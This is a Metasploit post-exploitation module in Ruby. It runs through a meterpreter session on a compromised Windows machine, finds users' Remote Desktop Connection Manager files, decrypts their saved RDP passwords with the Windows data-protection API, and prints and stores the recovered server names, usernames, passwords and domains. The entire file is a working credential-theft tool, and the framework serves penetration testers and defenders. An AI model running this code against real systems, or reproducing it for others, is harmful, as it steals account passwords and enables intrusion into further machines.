# -*- coding: binary -*-

##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

require 'rexml/document'
require 'msf/core/auxiliary/report'

class MetasploitModule < Msf::Post
  include Msf::Post::Windows::UserProfiles
  include Msf::Post::Windows::Priv
  include Msf::Auxiliary::Report
  include Msf::Post::File

  def initialize(info={})
    super( update_info( info,
        'Name'          => 'Windows Gather Remote Desktop Connection Manager Saved Password Extraction',
        'Description'   => %q{
          This module extracts and decrypts saved Microsoft Remote Desktop
          Connection Manager (RDCMan) passwords the .RDG files of users.
          The module will attempt to find the files configured for all users
          on the target system. Passwords for managed hosts are encrypted by
          default.  In order for decryption of these passwords to be successful,
          this module must be executed under the same account as the user which
          originally encrypted the password.  Passwords stored in plain text will
          be captured and documented.
        },
        'License'       => MSF_LICENSE,
        'Author'        => [ 'Tom Sellers <tom[at]fadedcode.net>'],
        'Platform'      => [ 'win' ],
        'SessionTypes'  => [ 'meterpreter' ]
      ))
  end

  def run
    if is_system?
      uid = session.sys.config.getuid
      print_warning("This module is running under #{uid}.")
      print_warning("Automatic decryption of encrypted passwords will not be possible.")
      print_warning("Migrate to a user process to achieve successful decryption (e.g. explorer.exe).")
    end

    settings_file = 'Microsoft Corporation\\Remote Desktop Connection Manager\RDCMan.settings'
    profiles = grab_user_profiles

    profiles.each do |user|
      next if user['LocalAppData'].nil?
      settings_path = "#{user['LocalAppData']}\\#{settings_file}"
      next unless file?(settings_path)
      print_status("Found settings for #{user['UserName']}.")

      settings = read_file(settings_path)
      connection_files = settings.scan(/string&gt;(.*?)&lt;\/string/)

      connection_files.each do |con_f|
        next unless session.fs.file.exist?(con_f[0])
        print_status("\tOpening RDC Manager server list: #{con_f[0]}")
        connection_data = read_file(con_f[0])
        if connection_data
          parse_connections(connection_data)
        else
          print_error("\tUnable to open RDC Manager server list: #{con_f[0]}")
          next
        end
      end
    end
  end

  def decrypt_password(data)
    rg = session.railgun
    rg.add_dll('crypt32') unless rg.get_dll('crypt32')

    pid = client.sys.process.getpid
    process = client.sys.process.open(pid, PROCESS_ALL_ACCESS)

    mem = process.memory.allocate(128)
    process.memory.write(mem, data)

    if session.sys.process.each_process.find { |i| i["pid"] == pid && i["arch"] == "x86"}
      addr = [mem].pack("V")
      len = [data.length].pack("V")
      ret = rg.crypt32.CryptUnprotectData("#{len}#{addr}", 16, nil, nil, nil, 0, 8)
      len, addr = ret["pDataOut"].unpack("V2")
    else
      addr = [mem].pack("Q")
      len = [data.length].pack("Q")
      ret = rg.crypt32.CryptUnprotectData("#{len}#{addr}", 16, nil, nil, nil, 0, 16)
      len, addr = ret["pDataOut"].unpack("Q2")
    end

    return "" if len == 0
    decrypted_pw = process.memory.read(addr, len)
    return decrypted_pw
  end

  def extract_password(object)
    if object.name == 'server'
      logon_creds = object.elements['logonCredentials']
    elsif object.elements['properties'] && object.elements['properties'].elements['logonCredentials']
      logon_creds = object.elements['properties'].elements['logonCredentials']
    else
      return nil, nil, nil
    end

    if logon_creds.attributes['inherit'] == "None"
      # The credentials are defined directly on the server
      username = logon_creds.elements['userName'].text
      domain = logon_creds.elements['domain'].text
      if logon_creds.elements['password'].attributes['storeAsClearText'] == "True"
        password = logon_creds.elements['password'].text
      else
        crypted_pass = Rex::Text.decode_base64(logon_creds.elements['password'].text)
        password = decrypt_password(crypted_pass)
        password = Rex::Text.to_ascii(password)
        if password.blank?
          print_warning("\tUnable to decrypt password, try migrating to a process running as the file's owner.")
        end
      end

    elsif logon_creds.attributes['inherit'] == "FromParent"
      # The credentials are inherited from a parent
      parent = object.parent
      username, password, domain = extract_password(parent)
    end

    return username, password, domain
  end

  def parse_connections(connection_data)
    doc = REXML::Document.new(connection_data)

    # Process all of the server records
    doc.elements.each("//server") do |server|
      svr_name = server.elements['name'].text
      username, password, domain = extract_password(server)
      if server.elements['connectionSettings'].attributes['inherit'] == "None"
        port = server.elements['connectionSettings'].elements['port'].text
      else
        port = 3389
      end

      print_status("\t\t#{svr_name} \t#{username} #{password} #{domain}")
      register_creds(svr_name, username, password, domain, port) if password || username
    end

    # Process all of the gateway elements, irrespective of server
    doc.elements.each("//gatewaySettings") do |gateway|
      next unless gateway.attributes['inherit'] == "None"
      svr_name = gateway.elements['hostName'].text
      username = gateway.elements['userName'].text
      domain = gateway.elements['domain'].text

      if gateway.elements['password'].attributes['storeAsClearText'] == "True"
        password = gateway.elements['password'].text
      else
        crypted_pass = Rex::Text.decode_base64(gateway.elements['password'].text)
        password = decrypt_password(crypted_pass)
        password = Rex::Text.to_ascii(password)
      end

      parent = gateway.parent
      if parent.elements['connectionSettings'].attributes['inherit'] == "None"
        port = parent.elements['connectionSettings'].elements['port'].text
      else
        port = 3389
      end

      print_status("\t\t#{svr_name} \t#{username} #{password} #{domain}")
      register_creds(svr_name, username, password, domain, port) if password || username
    end
  end

  def register_creds(host_ip, user, pass, realm, port)
    # Note that entries added by hostname instead of IP will not
    # generate complete records.  See discussion here:
    # https://github.com/rapid7/metasploit-framework/pull/3599#issuecomment-51710319

    # Build service information
    service_data = {
      address: host_ip,
      port: port,
      service_name: 'rdp',
      protocol: 'tcp',
      workspace_id: myworkspace_id
    }

    # Build credential information
    credential_data = {
      origin_type: :session,
      session_id: session_db_id,
      post_reference_name: self.refname,
      private_data: pass,
      private_type: :password,
      username: user,
      realm_key: Metasploit::Model::Realm::Key::ACTIVE_DIRECTORY_DOMAIN,
      realm_value: realm,
      workspace_id: myworkspace_id
    }

    credential_data.merge!(service_data)
    credential_core = create_credential(credential_data)

    # Assemble the options hash for creating the Metasploit::Credential::Login object
    login_data = {
      core: credential_core,
      status: Metasploit::Model::Login::Status::UNTRIED,
      workspace_id: myworkspace_id
    }

    login_data.merge!(service_data)
    create_credential_login(login_data)
  end
end
